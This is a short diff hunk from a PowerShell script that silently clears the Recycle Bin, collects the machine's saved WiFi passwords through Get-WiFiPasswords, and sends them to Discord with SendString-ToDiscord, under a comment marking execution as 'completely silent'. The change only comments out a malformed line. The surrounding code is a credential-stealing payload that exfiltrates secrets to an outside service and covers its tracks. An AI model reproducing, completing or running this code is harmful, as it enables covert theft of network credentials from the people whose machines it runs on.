@@ -50,7 +50,7 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 # Main execution - completely silent
 try {
-    Get WiFi passwords
+    #Get WiFi passwords
     $wifiPasswords = Get-WiFiPasswords
     
     SendString-ToDiscord $wifiPasswords
